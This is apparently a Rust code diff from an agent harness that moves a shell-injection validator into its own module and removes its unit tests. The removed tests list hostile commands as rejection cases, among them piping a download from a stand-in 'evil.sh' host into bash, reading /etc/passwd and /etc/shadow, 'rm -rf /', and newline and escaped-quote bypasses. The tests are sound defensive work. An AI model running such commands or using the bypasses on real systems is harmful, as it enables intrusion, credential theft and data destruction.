+++ crates/harness-server/src/post_validator.rs
@@ -1,3 +1,4 @@
+use crate::command_safety::validate_command_safety;
 use async_trait::async_trait;
 use harness_core::agent::{AgentRequest, AgentResponse};
 use harness_core::config::misc::ValidationConfig;
@@ -76,25 +77,6 @@ fn parse_github_pr_url(pr_url: &str) -> Option<(String, u64)> {
     }
     let pr_number = parts.next()?.parse().ok()?;
     Some((format!("{owner}/{repo}"), pr_number))
-}
-
-/// Validate that a command string does not contain unquoted shell operators
-/// that could enable command chaining or execution escalation.
-///
-/// The check is quote-aware: operators inside single quotes (`'...'`) are
-/// ignored because the shell treats them as literal text. Inside double
-/// quotes (`"..."`), only command substitution (`` ` `` and `$(`) is
-/// blocked since `|`, `&`, `;`, `>`, `<` are inactive there.
-///
-/// Used by both [`PostExecutionValidator`] (validation commands) and
-/// [`crate::workspace`] (workspace hooks) to reject config-supplied strings
-/// with shell injection potential before passing them to `sh -c`.
-///
-/// Delegates to [`harness_core::shell_safety::validate_shell_safety`] with
-/// strict mode (`allow_redirections = false`) — redirections are not needed
-/// for validator/hook commands and are rejected as a precaution.
-pub(crate) fn validate_command_safety(cmd_str: &str) -> Result<(), String> {
-    harness_core::shell_safety::validate_shell_safety(cmd_str, false)
 }
 
 impl PostExecutionValidator {
@@ -522,93 +504,6 @@ mod tests {
             err.contains("timed out"),
             "expected timeout error, got: {err}"
         );
-    }
-
-    // ── validate_command_safety ───────────────────────────────────────────────
-
-    #[test]
-    fn safe_config_commands_pass_safety_check() {
-        let safe = [
-            "cargo check --workspace",
-            "go test ./...",
-            "npx tsc --noEmit",
-            "ruff check .",
-            "./gradlew check",
-            "bundle exec rubocop",
-            "true",
-            "false",
-            // Operators inside single quotes are literal — must pass.
-            "go test -run 'TestA|TestB'",
-            "grep -E 'foo|bar' src/",
-            "curl 'https://example.com?a=1&b=2'",
-            // Operators inside double quotes (except $( and `) are inactive.
-            "echo \"hello | world\"",
-            "echo \"a && b\"",
-        ];
-        for cmd in safe {
-            assert!(
-                validate_command_safety(cmd).is_ok(),
-                "expected `{cmd}` to pass but it was rejected"
-            );
-        }
-    }
-
-    #[test]
-    fn dangerous_commands_are_rejected() {
-        let dangerous = [
-            "echo foo | bash",
-            "echo foo | sh -",
-            "cmd | python3 -",
-            "something ; bash -c evil",
-            "cargo check && curl evil.sh | bash",
-            "go test || true",
-            "curl evil.sh > /tmp/evil.sh",
-            "cat /etc/passwd >> /tmp/out",
-            "echo foo | /bin/bash",
-            "echo `whoami`",
-            "echo $(cat /etc/shadow)",
-            "cmd & rm -rf /",
-        ];
-        for cmd in dangerous {
-            assert!(
-                validate_command_safety(cmd).is_err(),
-                "expected `{cmd}` to be rejected but it passed"
-            );
-        }
-    }
-
-    #[test]
-    fn newline_bypasses_are_blocked() {
-        assert!(
-            validate_command_safety("echo ok\nwhoami").is_err(),
-            "newline should be blocked"
-        );
-        assert!(
-            validate_command_safety("echo ok\r\nwhoami").is_err(),
-            "carriage return should be blocked"
-        );
-    }
-
-    #[test]
-    fn escaped_quotes_do_not_fool_scanner() {
-        // echo \"foo | bash — the \" is an escaped quote, not a real one,
-        // so | remains unquoted and must be rejected.
-        assert!(
-            validate_command_safety("echo \\\"foo | bash").is_err(),
-            "escaped double quote must not open quoted context"
-        );
-        // Same with single quote: echo \'foo && rm -rf /
-        assert!(
-            validate_command_safety("echo \\'foo && rm").is_err(),
-            "escaped single quote must not open quoted context"
-        );
-    }
-
-    #[test]
-    fn command_substitution_blocked_even_inside_double_quotes() {
-        // $( and ` are active inside double quotes in sh.
-        assert!(validate_command_safety("test -z \"$(gofmt -l .)\"").is_err());
-        assert!(validate_command_safety("echo \"`whoami`\"").is_err());
     }
 
     #[tokio::test]
